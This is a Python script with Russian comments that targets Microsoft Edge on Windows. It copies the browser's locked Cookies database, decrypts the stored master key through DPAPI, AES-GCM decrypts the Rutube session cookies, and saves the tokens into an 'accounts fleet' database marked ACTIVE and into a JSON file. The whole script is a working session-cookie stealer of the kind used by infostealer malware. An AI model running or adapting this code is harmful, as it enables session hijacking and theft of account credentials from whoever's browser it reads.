"""
Копирование файла Cookies с флагом FILE_SHARE_READ | FILE_SHARE_WRITE
"""

import os
import json
import base64
import sqlite3
import ctypes
from ctypes import wintypes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

def decrypt_dpapi(encrypted_bytes):
    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.cast(encrypted_bytes, ctypes.POINTER(ctypes.c_byte)))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return data
    return None

def copy_locked_file(src, dst):
    # FILE_SHARE_READ = 1, FILE_SHARE_WRITE = 2, OPEN_EXISTING = 3, GENERIC_READ = 0x80000000
    kernel32 = ctypes.windll.kernel32
    GENERIC_READ = 0x80000000
    FILE_SHARE_READ = 1
    FILE_SHARE_WRITE = 2
    OPEN_EXISTING = 3
    
    h_file = kernel32.CreateFileW(
        src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None
    )
    if h_file == -1 or h_file == 0xFFFFFFFF:
        print("Не удалось открыть занятый файл")
        return False
        
    size_high = wintypes.DWORD()
    size_low = kernel32.GetFileSize(h_file, ctypes.byref(size_high))
    total_size = (size_high.value << 32) + size_low
    
    buff = ctypes.create_string_buffer(total_size)
    bytes_read = wintypes.DWORD()
    kernel32.ReadFile(h_file, buff, total_size, ctypes.byref(bytes_read), None)
    kernel32.CloseHandle(h_file)
    
    with open(dst, "wb") as f:
        f.write(buff.raw[:bytes_read.value])
    return True

def get_master_key():
    local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return decrypt_dpapi(encrypted_key)

def decrypt_val(master_key, encrypted_val):
    try:
        iv = encrypted_val[3:15]
        payload = encrypted_val[15:-16]
        tag = encrypted_val[-16:]
        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
        dec = cipher.decryptor()
        return (dec.update(payload) + dec.finalize()).decode('utf-8', errors='ignore')
    except Exception:
        return None

def extract():
    src = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies")
    dst = "edge_cookies_copy.db"
    if not copy_locked_file(src, dst):
        return
        
    key = get_master_key()
    conn = sqlite3.connect(dst)
    cur = conn.cursor()
    cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%rutube%'")
    rows = cur.fetchall()
    print(f"Всего кук Rutube в Edge: {len(rows)}")
    
    found_tokens = {}
    for host, name, enc in rows:
        val = decrypt_val(key, enc)
        if val:
            found_tokens[name] = val
            print(f"Кука найдена: {name} = {val[:12]}... (длина {len(val)})")
            
    conn.close()
    if os.path.exists(dst):
        os.remove(dst)
        
    # Сохраняем сессионные куки в базу
    if found_tokens:
        import sqlite3
        with sqlite3.connect("firm_environment/storage/accounts_fleet.db") as fleet_conn:
            fleet_conn.execute("""
                UPDATE fleet_accounts
                SET credentials_token = ?, status = 'ACTIVE'
                WHERE platform = 'Rutube'
            """, (json.dumps(found_tokens),))
            fleet_conn.commit()
        print(">>> Сессия Rutube успешно сохранена в accounts_fleet.db! Статус: ACTIVE")
        
        # Запишем cookies в файл rutube_session.json
        with open("firm_environment/storage/rutube_session.json", "w", encoding="utf-8") as f:
            json.dump(found_tokens, f, indent=2)

if __name__ == "__main__":
    extract()
